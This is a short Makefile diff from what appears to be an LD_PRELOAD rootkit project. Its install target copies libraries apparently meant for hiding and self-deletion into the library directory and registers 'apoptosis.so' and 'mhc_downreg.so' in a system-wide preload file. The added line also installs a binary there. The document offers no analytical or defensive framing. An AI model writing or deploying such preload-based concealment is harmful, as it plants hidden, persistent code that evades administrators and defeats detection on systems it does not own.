@@ -47,6 +47,7 @@ $(BIN_TARGET): $(BIN_SRC)
 install: $(HIDE_TARGET) $(SELFDELETE_TARGET)
 	cp $(HIDE_TARGET) $(LIBDIR)/
 	cp $(SELFDELETE_TARGET) $(LIBDIR)/
+	cp $(BIN_TARGET) $(LIBDIR)/
 	echo "$(LIBDIR)/apoptosis.so" >> $(PRELOAD_FILE)
 	echo "$(LIBDIR)/mhc_downreg.so" >> $(PRELOAD_FILE)
 	ldconfig
